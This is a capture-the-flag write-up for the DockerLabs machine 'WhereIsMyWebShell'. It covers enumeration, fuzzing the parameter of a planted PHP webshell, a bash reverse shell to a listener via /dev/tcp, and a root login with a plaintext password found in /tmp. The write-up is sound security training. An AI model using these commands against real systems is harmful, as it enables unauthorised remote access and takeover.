# WhereIsMyWebShell - DockerLabs - Easy

## Summary

**WhereIsMyWebShell** is an easy Linux machine from DockerLabs. The web server has a pre-existing PHP webshell uploaded by another attacker, but the GET parameter name is unknown. Parameter fuzzing with `ffuf` reveals the parameter, which is used to get a reverse shell as `www-data`. A hidden file in `/tmp/` contains the root password, allowing direct escalation via `su`.

---

## Tools

- `nmap` — port and service enumeration
- `gobuster` — web directory/file brute force
- `ffuf` — GET parameter fuzzing
- `curl` — reverse shell trigger
- `netcat (nc)` — reverse shell listener

---

## 1. Enumeration

### Port Scan

```bash
nmap -sC -sV -p- 172.17.0.2
```

Open ports:
- **80** — HTTP (Apache 2.4.58)

### Web Enumeration

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
```

Key findings:
- `/warning.html` — message: *"Esta web ha sido atacada por otro hacker, pero su webshell tiene un parámetro que no recuerdo..."*
- `/shell.php` — returns HTTP 500 with empty body (webshell exists but requires a parameter)

### Parameter Fuzzing

Since `shell.php` exists but returns 500, the GET parameter name must be found:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "http://172.17.0.2/shell.php?FUZZ=id" \
     -fs 0
```

**Result:** parameter name = `parameter`

Verify RCE:
```bash
curl -s "http://172.17.0.2/shell.php" --get --data-urlencode "parameter=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 2. Exploitation

### Reverse Shell

```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — trigger
curl -s "http://172.17.0.2/shell.php" --get \
     --data-urlencode "parameter=bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'"
```

Shell obtained as `www-data`.

### TTY Upgrade (no Python available)

```bash
script /dev/null -c bash
```

## 3. Escalate Privileges

### Enumeration

```bash
sudo -l          # sudo: command not found
find / -perm -4000 2>/dev/null   # no useful SUID binaries
cat /etc/passwd | grep '/bin/bash'  # only root has bash
ls /home         # empty
```

### Hidden file in /tmp

```bash
ls -la /tmp
# -rw-r--r-- 1 root root 21 Apr 12 2024 .secret.txt

cat /tmp/.secret.txt
# contraseñaderoot123
```

### su to root

```bash
su
# password: contraseñaderoot123

whoami
# root
```

## 4. Lessons Learned

1. **Always enumerate with multiple extensions** — `shell.php` would have been missed without `-x php` in gobuster.
2. **A 500 response on a PHP file means it exists but fails** — not a 404; investigate further with parameter fuzzing.
3. **Parameter fuzzing is essential for webshells** — `ffuf` or `wfuzz` with `burp-parameter-names.txt` covers the most common parameter names quickly.
4. **URL encoding matters for reverse shells** — using `curl --data-urlencode` avoids encoding issues with special characters in payloads.
5. **`ls -la` reveals hidden files** — `/tmp/.secret.txt` was invisible with plain `ls`; always use `-la`.
6. **No sudo doesn't mean no path to root** — credentials in plaintext files are a common privesc in CTFs; always check `/tmp`, `/var`, `/opt`, and world-readable files.
